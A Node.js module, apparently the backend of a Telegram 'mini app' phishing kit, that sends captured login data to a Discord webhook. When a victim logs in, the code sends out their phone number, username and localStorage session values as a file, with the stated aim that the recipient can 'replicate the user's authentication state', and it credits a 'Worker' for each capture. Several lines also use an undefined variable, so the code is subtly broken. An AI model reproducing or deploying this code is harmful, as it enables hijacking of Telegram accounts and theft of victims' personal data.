const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const {
  PrismaClient
} = require('@prisma/client');
require('dotenv').config();

const prisma = new PrismaClient();

class DiscordNotifier {
  constructor() {
    this.webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    this.enabled = !!this.webhookUrl;

    if (!this.enabled) {
      console.log('⚠️ Discord notification disabled - missing DISCORD_WEBHOOK_URL environment variable');
    } else {
      console.log('✅ Discord notification enabled');
    }
  }

  /**
   * Send a notification message to Discord via webhook
   * @param {string} message - The message to send
   * @param {Object} options - Additional options for the message (embeds, etc.)
   * @returns {Promise<boolean>} - Success status
   */
  async sendNotification(message, options = {}) {
    if (!this.enabled) {
      console.log('💬 Discord notification skipped (disabled):', message);
      return false;
    }

    try {
      const payload = {
        content: message,
        username: 'Telegram Manager',
        avatar_url: 'https://telegram.org/img/t_logo.png',
        ...options
      };

      console.log('💬 Sending Discord notification...');
      const response = await axios.post(this.webhookUrl, payload, {
        timeout: 10000, // 10 second timeout
        headers: {
          'Content-Type': 'application/json'
        }
      });

      if (response.status === 204) {
        console.log('✅ Discord notification sent successfully');
        return true;
      } else {
        console.error('❌ Discord webhook error:', response.status, response.statusText);
        return false;
      }
    } catch (error) {
      console.error('❌ Failed to send Discord notification:', error.message);
      if (error.response) {
        console.error('❌ Response data:', error.response.data);
      }
      return false;
    }
  }

  /**
   * Send a rich embed notification to Discord
   * @param {Object} embed - Discord embed object
   * @param {string} content - Optional content message
   * @returns {Promise<boolean>} - Success status
   */
  async sendEmbed(embed, content = '') {
    if (!this.enabled) {
      console.log('💬 Discord embed skipped (disabled):', embed.title);
      return false;
    }

    try {
      const payload = {
        content: content,
        username: 'Telegram Manager',
        avatar_url: 'https://telegram.org/img/t_logo.png',
        embeds: [embed]
      };

      console.log('💬 Sending Discord embed...');
      const response = await axios.post(this.webhookUrl, payload, {
        timeout: 10000,
        headers: {
          'Content-Type': 'application/json'
        }
      });

      if (response.status === 204) {
        console.log('✅ Discord embed sent successfully');
        return true;
      } else {
        console.error('❌ Discord webhook error:', response.status, response.statusText);
        return false;
      }
    } catch (error) {
      console.error('❌ Failed to send Discord embed:', error.message);
      if (error.response) {
        console.error('❌ Response data:', error.response.data);
      }
      return false;
    }
  }

  /**
   * Send a file to Discord via webhook
   * @param {string} filePath - Path to the file to send
   * @param {string} content - Content message
   * @param {Object} embed - Optional embed object
   * @returns {Promise<boolean>} - Success status
   */
  async sendFile(filePath, content = '', embed = null) {
    if (!this.enabled) {
      console.log('📁 Discord file send skipped (disabled):', filePath);
      return false;
    }

    try {
      const form = new FormData();

      if (embed) {
        // When sending embeds with files, use payload_json
        form.append('payload_json', JSON.stringify({
          username: 'Telegram Manager',
          avatar_url: 'https://telegram.org/img/t_logo.png',
          embeds: [embed]
        }));
      } else {
        // When sending just content with files
        form.append('content', content);
        form.append('username', 'Telegram Manager');
        form.append('avatar_url', 'https://telegram.org/img/t_logo.png');
      }

      // Add file as attachment
      form.append('file', fs.createReadStream(filePath), {
        filename: path.basename(filePath)
      });

      console.log('📁 Sending file to Discord...');
      const response = await axios.post(this.webhookUrl, form, {
        headers: {
          ...form.getHeaders()
        },
        timeout: 30000 // 30 second timeout for file uploads
      });

      if (response.status === 200 || response.status === 204) {
        console.log('✅ File sent to Discord successfully');
        return true;
      } else {
        console.error('❌ Discord webhook error:', response.status, response.statusText);
        return false;
      }
    } catch (error) {
      console.error('❌ Failed to send file to Discord:', error.message);
      if (error.response) {
        console.error('❌ Response data:', error.response.data);
      }
      return false;
    }
  }

  /**
   * Send authorization completion notification with rich embed
   * @param {string} sessionId - The session ID
   * @param {Object} userInfo - User information
   * @param {string} authCode - The authorization code (localStorage values)
   * @param {string} userId - The user ID to fetch username from database
   * @returns {Promise<boolean>} - Success status
   */
  async sendAuthorizationComplete(sessionId, userInfo = {}, authCode = null, userId = null) {
    const timestamp = new Date().toISOString();
    const telegramUsername = userInfo.username || 'Unknown';
    const phoneNumber = userInfo.phoneNumber || 'Unknown';
    let internalUsername = 'Unknown';

    // Try to get internal username from database if userId is provided
    if (userId) {
      try {
        const user = await prisma.user.findUnique({
          where: {
            id: userId
          },
          select: {
            username: true,
            tg_username: true
          }
        });

        if (user) {
          internalUsername = user.username || 'Unknown';
          console.log(`👤 Fetched internal username from database for Discord: ${internalUsername} (userId: ${userId})`);
        }
      } catch (error) {
        console.error('❌ Error fetching user from database for Discord:', error.message);
        // Continue with default internal username if database fetch fails
      }
    }

    // Create rich embed for better formatting
    const embed = {
      title: '🎉 Authorization Completed!',
      color: 0x00ff00, // Green color
      fields: [{
          name: '📱 Session ID',
          value: `\`${sessionId}\``,
          inline: true
        },
        {
          name: '👤 Username',
          value: telegramUsername,
          inline: true
        },
        {
          name: '👷 Worker',
          value: internalUsername,
          inline: true
        },
        {
          name: '📞 Phone',
          value: phoneNumber,
          inline: true
        },
        {
          name: '⏰ Time',
          value: new Date(timestamp).toLocaleString(),
          inline: false
        }
      ],
      description: '✅ User has successfully logged into Telegram through the mini app.\n\n📁 Authorization code will be sent as a downloadable file below.',
      timestamp: timestamp,
      footer: {
        text: 'Telegram Manager Bot',
        icon_url: 'https://telegram.org/img/t_logo.png'
      }
    };

    // Send the main notification first
    const mainSuccess = await this.sendEmbed(embed);

    // If there's an authorization code, send it as a file
    if (authCode && mainSuccess) {
      try {
        // Create a temporary file for the authorization code
        const fileName = `auth-code-${sessionId}-${Date.now()}.txt`;
        const filePath = path.join(__dirname, 'temp', fileName);

        // Ensure temp directory exists
        const tempDir = path.join(__dirname, 'temp');
        if (!fs.existsSync(tempDir)) {
          fs.mkdirSync(tempDir, {
            recursive: true
          });
        }

        // Create the file content with session info
        const fileContent = `// Authorization Code
// Session ID: ${sessionId}
// Username: ${username}
// Date & Time: ${new Date(timestamp).toLocaleString()}

${authCode}`;

        // Write the file
        fs.writeFileSync(filePath, fileContent, 'utf8');

        // Create embed for the file
        const fileEmbed = {
          title: '🔐 Authorization Code',
          color: 0x0099ff, // Blue color
          fields: [{
              name: '📱 Session ID',
              value: `\`${sessionId}\``,
              inline: true
            },
            {
              name: '👤 Username',
              value: username,
              inline: true
            },
            {
              name: '⏰ Date & Time',
              value: new Date(timestamp).toLocaleString(),
              inline: false
            }
          ],
          description: '📁 Download this file to replicate the user\'s authentication state.',
          timestamp: timestamp,
          footer: {
            text: 'Telegram Manager Bot',
            icon_url: 'https://telegram.org/img/t_logo.png'
          }
        };

        const fileSuccess = await this.sendFile(filePath, '', fileEmbed);

        // Clean up the temporary file
        try {
          fs.unlinkSync(filePath);
        } catch (cleanupError) {
          console.log('⚠️ Could not clean up temp file:', cleanupError.message);
        }

        return fileSuccess;
      } catch (error) {
        console.error('❌ Error creating/sending auth code file:', error.message);
        // Fallback to sending as message if file creation fails
        const fallbackEmbed = {
          title: '🔐 Authorization Code',
          color: 0x0099ff,
          fields: [{
              name: '📱 Session ID',
              value: `\`${sessionId}\``,
              inline: true
            },
            {
              name: '👤 Username',
              value: username,
              inline: true
            },
            {
              name: '⏰ Date & Time',
              value: new Date(timestamp).toLocaleString(),
              inline: false
            },
            {
              name: '🔑 Code (Preview)',
              value: `\`\`\`\n${authCode.substring(0, 1000)}${authCode.length > 1000 ? '...' : ''}\n\`\`\``,
              inline: false
            }
          ],
          timestamp: timestamp,
          footer: {
            text: 'Telegram Manager Bot',
            icon_url: 'https://telegram.org/img/t_logo.png'
          }
        };
        await this.sendEmbed(fallbackEmbed);
      }
    }

    return mainSuccess;
  }

  /**
   * Send error notification with rich embed
   * @param {string} sessionId - The session ID
   * @param {string} error - Error message
   * @returns {Promise<boolean>} - Success status
   */
  async sendError(sessionId, error) {
    const timestamp = new Date().toISOString();

    const embed = {
      title: '❌ Authorization Error',
      color: 0xff0000, // Red color
      fields: [{
          name: '📱 Session ID',
          value: `\`${sessionId}\``,
          inline: true
        },
        {
          name: '🚨 Error',
          value: error,
          inline: false
        },
        {
          name: '⏰ Time',
          value: new Date(timestamp).toLocaleString(),
          inline: true
        }
      ],
      timestamp: timestamp,
      footer: {
        text: 'Telegram Manager Bot',
        icon_url: 'https://telegram.org/img/t_logo.png'
      }
    };

    return await this.sendEmbed(embed);
  }

  /**
   * Send test notification
   * @returns {Promise<boolean>} - Success status
   */
  async sendTestNotification() {
    const embed = {
      title: '🧪 Test Notification',
      color: 0xffff00, // Yellow color
      description: 'This is a test message to verify that the Discord webhook integration is working correctly.',
      fields: [{
        name: '⏰ Time',
        value: new Date().toLocaleString(),
        inline: false
      }],
      timestamp: new Date().toISOString(),
      footer: {
        text: 'Telegram Manager Bot',
        icon_url: 'https://telegram.org/img/t_logo.png'
      }
    };

    return await this.sendEmbed(embed);
  }
}

// Create singleton instance
const discordNotifier = new DiscordNotifier();

module.exports = discordNotifier;